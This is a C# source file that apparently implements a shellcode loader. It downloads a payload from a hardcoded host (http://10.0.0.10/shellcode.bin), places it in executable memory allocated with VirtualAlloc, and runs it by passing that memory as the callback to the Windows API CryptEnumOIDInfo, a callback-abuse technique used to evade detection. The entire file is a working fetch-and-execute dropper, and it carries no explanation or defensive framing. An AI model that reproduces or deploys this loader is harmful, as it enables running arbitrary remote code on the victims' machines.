using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CryptEnumOIDInfo
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            CryptEnumOIDInfo(null, null, IntPtr.Zero, addr);

            //WaitForSingleObject(addr, 0xFFFFFFFF);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern IntPtr CryptEnumOIDInfo(String dwGroupId, String dwFlags, IntPtr pvArg, IntPtr pfnEnumOIDInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
}
